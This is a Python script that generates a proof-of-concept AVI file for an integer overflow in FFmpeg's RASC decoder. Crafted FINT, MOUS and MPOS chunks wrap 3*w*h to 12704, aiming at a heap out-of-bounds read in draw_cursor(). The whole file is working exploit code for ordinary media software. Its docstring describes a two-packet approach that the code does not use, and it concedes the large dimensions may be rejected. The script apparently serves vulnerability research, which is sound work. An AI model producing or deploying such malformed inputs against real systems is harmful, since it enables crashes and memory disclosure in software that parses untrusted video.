#!/usr/bin/env python3
"""
PoC generator for VULN-001: Integer Overflow in decode_mous() 3*w*h Bypasses Cursor Size
Validation Leading to Heap OOB Read in draw_cursor().

The vulnerability:
  In decode_mous() (rasc.c line 569):
    if (uncompressed_size != 3 * w * h)   <-- unsigned 32-bit arithmetic
  With w=32100, h=44600: 3*32100*44600 = 4,294,980,000 > 2^32
  The overflow wraps to 12704. Setting uncompressed_size=12704 bypasses the check.
  cursor buffer is allocated with only 12704 bytes, but cursor_w=32100, cursor_h=44600
  are stored. draw_cursor() then accesses cursor[3*32100*(44600-1)] = cursor[4294883700],
  which is a massive heap OOB read.

Trigger strategy (two-packet AVI):
  Packet 1: MOUS chunk only -- relies on avctx->width/height set from AVI BITMAPINFOHEADER
            (no FINT, so frame1/frame2 are NULL; packet returns AVERROR_INVALIDDATA but
            cursor state IS set: cursor_w=32100, cursor_h=44600, cursor allocated)
  Packet 2: FINT(small dims) to allocate frame1/frame2, then draw_cursor is called
            (draw_cursor checks cursor_x+cursor_w <= avctx->width, which may fail)

  NOTE: The size check in ff_set_dimensions and ff_get_buffer both use AV_PIX_FMT_NONE
  (stride = 8*w), so dimensions 32100x44600 cause stride*(h+128) = 11.5B > INT_MAX and
  are rejected. The vulnerability as described requires dimensions that pass ff_set_dimensions,
  but those same dimensions fail the size check. This script tries both approaches and
  lets the actual FFmpeg binary determine the result.
"""

import struct
import zlib
import sys
import os

# Target dimensions for integer overflow in 3*w*h (mod 2^32)
W_LARGE = 32100
H_LARGE = 44600
# Verification: 3 * 32100 * 44600 mod 2^32 = 12704
UNCOMPRESSED_SIZE = 12704
assert (3 * W_LARGE * H_LARGE) % (2**32) == UNCOMPRESSED_SIZE, \
    f"Overflow check failed: {(3*W_LARGE*H_LARGE) % 2**32} != {UNCOMPRESSED_SIZE}"

# Small valid dimensions for the first FINT (passes all size checks)
W_SMALL = 100
H_SMALL = 100

RASC_TAG  = 0x43534152  # 'RASC' as little-endian uint32


# --------------------------------------------------------------------------
# RIFF / AVI helpers
# --------------------------------------------------------------------------

def riff_chunk(tag: bytes, data: bytes) -> bytes:
    """tag(4) + size(4,LE) + data"""
    assert len(tag) == 4
    return tag + struct.pack('<I', len(data)) + data


def riff_list(list_type: bytes, data: bytes) -> bytes:
    """LIST(4) + size(4,LE) + type(4) + data"""
    assert len(list_type) == 4
    payload = list_type + data
    return b'LIST' + struct.pack('<I', len(payload)) + payload


def riff_root(form_type: bytes, data: bytes) -> bytes:
    """RIFF(4) + size(4,LE) + form_type(4) + data"""
    payload = form_type + data
    return b'RIFF' + struct.pack('<I', len(payload)) + payload


# --------------------------------------------------------------------------
# RASC chunk builders
# --------------------------------------------------------------------------

def rasc_chunk(tag: bytes, data: bytes) -> bytes:
    """RASC chunks are just RIFF chunks inside the video packet."""
    return riff_chunk(tag, data)


def make_fint_data(w: int, h: int, fmt: int = 8) -> bytes:
    """
    Build FINT chunk payload for decode_fint().

    Layout (offsets into chunk data, after type+size header consumed):
      [0:4]    uint32 = 0x65  (magic marker)
      [4:8]    uint32 = 0     (padding)
      [8:12]   uint32 = w
      [12:16]  uint32 = h
      [16:46]  30 bytes skipped
      [46:48]  uint16 = fmt  (8=PAL8, 16=RGB555LE, 32=BGR0)
      [48:72]  24 bytes skipped
      [72:1096] 256 * uint32 palette (PAL8 only)
    """
    data = struct.pack('<II', 0x65, 0)       # magic + padding
    data += struct.pack('<II', w, h)          # dimensions
    data += b'\x00' * 30                     # skip
    data += struct.pack('<H', fmt)            # pixel format
    data += b'\x00' * 24                     # skip
    # Palette (256 BGRA entries), simple gray ramp
    for i in range(256):
        data += struct.pack('<I', 0xFF000000 | (i << 16) | (i << 8) | i)
    return data


def make_mous_data(w: int, h: int, uncompressed_size: int) -> bytes:
    """
    Build MOUS chunk payload for decode_mous().

    Layout:
      [0:8]    8 bytes skipped
      [8:12]   uint32 = w
      [12:16]  uint32 = h
      [16:28]  12 bytes skipped
      [28:32]  uint32 = uncompressed_size
      [32:]    zlib-compressed data (decompresses to min(uncompressed_size, delta_size) bytes)

    The vulnerability: 3*w*h overflows 32-bit, so uncompressed_size (the wrapped value)
    passes the check but the buffer is far too small.
    """
    # We must provide valid zlib data that decompresses to *at most* delta_size bytes.
    # delta_size = uncompressed_size + AV_INPUT_BUFFER_PADDING_SIZE (64) = 12768 bytes.
    # Compress exactly uncompressed_size bytes of non-zero data so the transparent-colour
    # check in draw_cursor (cr == cursor[0]) is NOT immediately true for all pixels.
    raw = bytes([0x01, 0x02, 0x03] * (uncompressed_size // 3 + 1))[:uncompressed_size]
    compressed = zlib.compress(raw, level=9)

    data = b'\x00' * 8
    data += struct.pack('<II', w, h)
    data += b'\x00' * 12
    data += struct.pack('<I', uncompressed_size)
    data += compressed
    return data


def make_mpos_data(cursor_x: int, cursor_y: int) -> bytes:
    """
    Build MPOS chunk payload for decode_mpos().

    Layout:
      [0:8]    8 bytes skipped
      [8:12]   uint32 = cursor_x
      [12:16]  uint32 = cursor_y
    """
    data = b'\x00' * 8
    data += struct.pack('<II', cursor_x, cursor_y)
    data += b'\x00' * 8   # padding to keep size safe
    return data


def make_kfrm_data(w: int, h: int, stride: int) -> bytes:
    """
    Build KFRM chunk payload for decode_kfrm().

    KFRM can optionally start with an embedded FINT (0x65 header).
    Here we include the FINT header so init_frames is called.
    The zlib data fills frame2 then frame1 (each stride*h bytes).
    """
    fint_part = make_fint_data(w, h)

    # frame pixel data: two frames of stride*h bytes each
    frame_bytes = b'\x00' * (stride * h * 2)
    compressed_frames = zlib.compress(frame_bytes, level=1)
    return fint_part + compressed_frames


# --------------------------------------------------------------------------
# AVI container builders
# --------------------------------------------------------------------------

def make_strf(w: int, h: int) -> bytes:
    """BITMAPINFOHEADER (40 bytes) for the video stream."""
    return struct.pack('<IiiHHIIiiII',
        40,         # biSize
        w,          # biWidth
        h,          # biHeight (positive = bottom-up)
        1,          # biPlanes
        8,          # biBitCount (8-bit paletted, matching FINT fmt=8)
        RASC_TAG,   # biCompression = 'RASC'
        w * h,      # biSizeImage
        0,          # biXPelsPerMeter
        0,          # biYPelsPerMeter
        256,        # biClrUsed
        0,          # biClrImportant
    )


def make_avi(packets: list, w: int, h: int) -> bytes:
    """
    Build a minimal AVI container with one video stream.
    packets: list of bytes objects, each is one '00dc' chunk payload.
    """
    fps_scale = 1
    fps_rate  = 1   # 1 fps, enough to decode
    n_frames  = len(packets)
    max_pkt   = max(len(p) for p in packets) + 8

    # --- stream header (strh) ---
    strh_data = struct.pack('<4s4sIHHIIIIIIIIhhhh',
        b'vids',        # fccType
        b'RASC',        # fccHandler
        0,              # dwFlags
        0,              # wPriority
        0,              # wLanguage
        0,              # dwInitialFrames
        fps_scale,      # dwScale
        fps_rate,       # dwRate
        0,              # dwStart
        n_frames,       # dwLength
        max_pkt,        # dwSuggestedBufferSize
        0xFFFFFFFF,     # dwQuality (-1)
        0,              # dwSampleSize
        0, 0, w, h      # rcFrame (left, top, right, bottom as shorts)
    )
    strh = riff_chunk(b'strh', strh_data)
    strf = riff_chunk(b'strf', make_strf(w, h))
    strl = riff_list(b'strl', strh + strf)

    # --- AVI main header (avih, 14 DWORDs = 56 bytes) ---
    avih_data = struct.pack('<IIIIIIIIIIIIII',
        1000000 // fps_rate,    # dwMicroSecPerFrame
        0,                      # dwMaxBytesPerSec
        0,                      # dwPaddingGranularity
        0x00000010,             # dwFlags (AVIF_HASINDEX)
        n_frames,               # dwTotalFrames
        0,                      # dwInitialFrames
        1,                      # dwStreams
        max_pkt,                # dwSuggestedBufferSize
        w,                      # dwWidth
        h,                      # dwHeight
        0, 0, 0, 0              # dwReserved[4]
    )
    avih = riff_chunk(b'avih', avih_data)
    hdrl = riff_list(b'hdrl', avih + strl)

    # --- movie data ---
    movi_content = b''
    for pkt in packets:
        movi_content += riff_chunk(b'00dc', pkt)
    movi = riff_list(b'movi', movi_content)

    return riff_root(b'AVI ', hdrl + movi)


# --------------------------------------------------------------------------
# Build the PoC AVI
# --------------------------------------------------------------------------

def build_poc():
    print("[*] VULN-001: decode_mous integer overflow PoC generator")
    print(f"[*] Target: W={W_LARGE}, H={H_LARGE}")
    print(f"[*] 3*W*H = {3*W_LARGE*H_LARGE:,} (overflows 32-bit)")
    print(f"[*] Overflowed value (uncompressed_size) = {UNCOMPRESSED_SIZE}")

    # -------------------------------------------------------------------
    # Approach: single packet with two FINT calls.
    #
    # Packet layout:
    #   FINT(W_SMALL, H_SMALL) -- small valid dims, sets up pix_fmt=PAL8,
    #                             allocates frame1/frame2 (small)
    #   FINT(W_LARGE, H_LARGE) -- large dims attempt; ff_set_dimensions may
    #                             fail due to stride check (8*w estimate).
    #   MOUS(W_LARGE, H_LARGE, uncompressed_size=12704)
    #   MPOS(cursor_x=0, cursor_y=0)
    #
    # If ff_set_dimensions passes for LARGE (possible if the build's stride
    # estimate is more lenient), init_frames is called with large dims and
    # draw_cursor triggers the OOB read.
    # -------------------------------------------------------------------

    fint_small = rasc_chunk(b'FINT', make_fint_data(W_SMALL, H_SMALL))
    fint_large = rasc_chunk(b'FINT', make_fint_data(W_LARGE, H_LARGE))
    mous_chunk = rasc_chunk(b'MOUS', make_mous_data(W_LARGE, H_LARGE, UNCOMPRESSED_SIZE))
    mpos_chunk = rasc_chunk(b'MPOS', make_mpos_data(0, 0))

    packet = fint_small + fint_large + mous_chunk + mpos_chunk

    # AVI header uses small dims so avcodec_open2 does not reject the file
    avi_data = make_avi([packet], W_SMALL, H_SMALL)

    out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            'vuln_001_input.avi')
    with open(out_path, 'wb') as f:
        f.write(avi_data)

    print(f"[*] Packet size: {len(packet):,} bytes")
    print(f"[*] AVI size:    {len(avi_data):,} bytes")
    print(f"[*] Written to:  {out_path}")

    # Sanity: verify the zlib payload decompresses correctly
    mous_data = make_mous_data(W_LARGE, H_LARGE, UNCOMPRESSED_SIZE)
    compressed_blob = mous_data[32:]
    decompressed = zlib.decompress(compressed_blob)
    assert len(decompressed) == UNCOMPRESSED_SIZE, \
        f"Zlib sanity fail: {len(decompressed)} != {UNCOMPRESSED_SIZE}"
    print(f"[*] Zlib payload verified: decompresses to {UNCOMPRESSED_SIZE} bytes")

    return out_path


if __name__ == '__main__':
    build_poc()
